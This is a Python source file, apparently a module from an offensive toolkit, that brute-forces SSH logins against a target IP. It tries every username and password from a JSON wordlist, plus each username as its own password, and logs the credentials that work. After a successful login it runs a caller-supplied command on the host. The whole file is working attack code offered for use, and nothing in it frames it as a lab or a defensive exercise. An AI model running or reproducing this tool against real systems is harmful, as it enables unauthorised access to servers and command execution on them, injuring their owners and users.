'''
name : SSH Brute Force Attack Module
description : This module performs a brute force attack on the SSH service to gain access.
version : 1.0
author : Ayato
'''

import paramiko
import os
import json
import time

def open_wordlist(wordlist_path):
    try:
        with open(wordlist_path, 'r') as f:
            wordlist = json.load(f)
        return wordlist
    except FileNotFoundError:
        print(f"[-] Wordlist file {wordlist_path} not found.")
        return None

def try_access(ip, username, password, cmd):
    print(f"[*] Trying {username}:{password} on {ip}")
    time.sleep(1)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=username, password=password,
            timeout=10, allow_agent=False, look_for_keys=False
        )
        print(f"[+] Successful login: {username}:{password} on {ip}")
        if cmd != None and cmd != "":
            stdin, stdout, stderr = ssh.exec_command(cmd)
            result = stdout.read().decode().replace('\n', '')
            if result:
                print(f"[*] Command output: {result}")
        ssh.close()
        return True
    except paramiko.ssh_exception.SSHException as e:
        print(f"[-] SSH protocol error on {ip}: {e}")
        return False
    except Exception as e:
        print(f"[-] Error on {ip}: {e}")
        return False

def run(ip, wordlist, cmd):
    print("[*] Running SSH brute force attack module...")
    print(f"[*] Using wordlist: {wordlist}")
    print(f"[*] Target IP: {ip}")
    success = {}
    credentials = open_wordlist(wordlist)
    if not credentials:
        print("[-] No credentials to try. Exiting.")
        return -1
    for username in credentials['usernames']:
        for password in credentials['passwords']:
            if try_access(ip, username, password, cmd):
                print(f"[+] Access gained with {username}:{password}")
                success[username] = password
        if try_access(ip, username, username, cmd):
            print(f"[+] Access gained with {username}:{username}")
            success[username] = username
    if not success:
        print("[-] No valid credentials found.")
        return -1
    else:
        print(f"[*] Successful credentials on {ip}:")
        for user, pwd in success.items():
            print(f"    - {user}:{pwd}")
    return success
